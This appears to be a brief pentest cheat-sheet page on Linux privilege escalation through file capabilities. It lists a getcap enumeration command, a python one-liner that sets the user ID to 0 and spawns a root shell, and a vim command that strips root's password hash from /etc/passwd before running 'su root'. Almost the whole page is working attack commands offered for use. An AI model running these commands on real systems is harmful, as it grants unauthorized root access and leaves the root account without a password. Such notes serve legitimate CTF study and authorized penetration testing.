# capability

get system capability

```
 getcap -r / 2>/dev/null 
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
usr/bin/python2.6  -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

<figure><img src="../../../.gitbook/assets/image 1 (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

***

> try to edit on `/etc/passwd` if the first case not work

```
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

su root
```

<figure><img src="../../../.gitbook/assets/image 2 (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
